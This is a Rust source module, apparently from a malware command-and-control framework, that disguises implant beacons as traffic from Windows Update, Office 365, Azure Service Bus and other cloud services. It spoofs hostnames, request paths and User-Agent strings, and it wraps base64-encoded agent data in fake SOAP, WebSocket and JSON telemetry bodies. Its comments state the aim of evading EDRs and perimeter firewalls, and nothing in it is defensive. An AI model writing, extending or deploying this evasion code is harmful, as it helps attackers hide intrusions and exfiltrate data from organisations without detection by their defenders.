// Smoke Signals: C2 traffic camouflaged as legitimate cloud services.
// Emulates traffic patterns of Windows Update, Office 365, Azure Service Bus.
// Each beacon looks like telemetry from a real corporate service.
// EDRs and perimeter firewalls see legitimate TLS traffic.

/// Service templates for traffic emulation.
#[derive(Debug, Clone)]
pub enum SmokeChannel {
    WindowsUpdate,     // *.windowsupdate.com, *.update.microsoft.com
    Office365,         // outlook.office365.com, *.sharepoint.com
    AzureServiceBus,   // *.servicebus.windows.net (WebSocket)
    GoogleDrive,       // *.googleapis.com/drive
    GitHubActions,     // pipelines.actions.githubusercontent.com
    ApplePush,         // *.push.apple.com
    CloudFrontCDN,     // *.cloudfront.net
}

impl SmokeChannel {
    /// Get the hostname pattern for this channel.
    pub fn host(&self) -> &str {
        match self {
            SmokeChannel::WindowsUpdate => "ctldl.windowsupdate.com",
            SmokeChannel::Office365 => "outlook.office365.com",
            SmokeChannel::AzureServiceBus => "swarm-eu.servicebus.windows.net",
            SmokeChannel::GoogleDrive => "www.googleapis.com",
            SmokeChannel::GitHubActions => "pipelines.actions.githubusercontent.com",
            SmokeChannel::ApplePush => "17.push.apple.com",
            SmokeChannel::CloudFrontCDN => "d3v4eglov6.execute-api.us-east-1.amazonaws.com",
        }
    }

    /// Get typical request path pattern.
    pub fn path(&self) -> &str {
        match self {
            SmokeChannel::WindowsUpdate => "/v6/ClientWebService/client.asmx",
            SmokeChannel::Office365 => "/autodiscover/autodiscover.xml",
            SmokeChannel::AzureServiceBus => "/$servicebus/websocket",
            SmokeChannel::GoogleDrive => "/drive/v3/files",
            SmokeChannel::GitHubActions => "/_apis/pipelines/workflows",
            SmokeChannel::ApplePush => "/push/v1/topic",
            SmokeChannel::CloudFrontCDN => "/prod/analytics",
        }
    }

    /// Get typical User-Agent for this service.
    pub fn user_agent(&self) -> &str {
        match self {
            SmokeChannel::WindowsUpdate => "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.40",
            SmokeChannel::Office365 => "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)",
            SmokeChannel::AzureServiceBus => "azsdk-net-Messaging.ServiceBus/7.11.0 (.NET 6.0.25; Windows 10.0.22621)",
            SmokeChannel::GoogleDrive => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
            SmokeChannel::GitHubActions => "GitHubActionsRunner/2.311.0 (Ubuntu 22.04)",
            SmokeChannel::ApplePush => "akd/1.0 CFNetwork/1410.0.3 Darwin/22.6.0",
            SmokeChannel::CloudFrontCDN => "Boto3/1.28.62 Python/3.11.5 Linux/6.2.0-35-generic",
        }
    }

    /// Random channel selection for traffic diversity.
    pub fn random() -> Self {
        use rand::Rng;
        match rand::thread_rng().gen_range(0..7) {
            0 => SmokeChannel::WindowsUpdate,
            1 => SmokeChannel::Office365,
            2 => SmokeChannel::AzureServiceBus,
            3 => SmokeChannel::GoogleDrive,
            4 => SmokeChannel::GitHubActions,
            5 => SmokeChannel::ApplePush,
            _ => SmokeChannel::CloudFrontCDN,
        }
    }
}

/// Build a beacon payload disguised as legitimate service traffic.
pub fn build_smoke_beacon(channel: &SmokeChannel, agent_data: &[u8]) -> Vec<u8> {
    let payload_b64 = base64_encode(agent_data);
    
    match channel {
        SmokeChannel::WindowsUpdate => {
            format!(
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\
                 <s:Body><GetConfig xmlns=\"http://schemas.microsoft.com/wu/2011/01/ClientWebService\">\
                 <clientInfo><mId>{}</mId></clientInfo>\
                 </GetConfig></s:Body></s:Envelope>",
                payload_b64
            ).into_bytes()
        }
        SmokeChannel::AzureServiceBus => {
            // WebSocket frame disguised as Service Bus message
            let mut frame = Vec::new();
            frame.push(0x82); // binary frame, final
            let len = payload_b64.len();
            if len < 126 {
                frame.push(len as u8);
            } else {
                frame.push(126);
                frame.extend_from_slice(&(len as u16).to_be_bytes());
            }
            frame.extend_from_slice(payload_b64.as_bytes());
            frame
        }
        _ => {
            // Generic JSON telemetry
            format!(
                r#"{{"timestamp":"{}","agent":"{}","device":"{}","version":"{}","metrics":{{"data":"{}"}}}}"#,
                chrono::Local::now().to_rfc3339(),
                uuid::Uuid::new_v4(),
                channel.host(),
                "10.0.22621.1",
                payload_b64,
            ).into_bytes()
        }
    }
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut s = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk.get(0).copied().unwrap_or(0) as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let t = (b0 << 16) | (b1 << 8) | b2;
        s.push(CHARS[((t >> 18) & 0x3F) as usize] as char);
        s.push(CHARS[((t >> 12) & 0x3F) as usize] as char);
        s.push(if chunk.len() > 1 { CHARS[((t >> 6) & 0x3F) as usize] as char } else { '=' });
        s.push(if chunk.len() > 2 { CHARS[(t & 0x3F) as usize] as char } else { '=' });
    }
    s
}
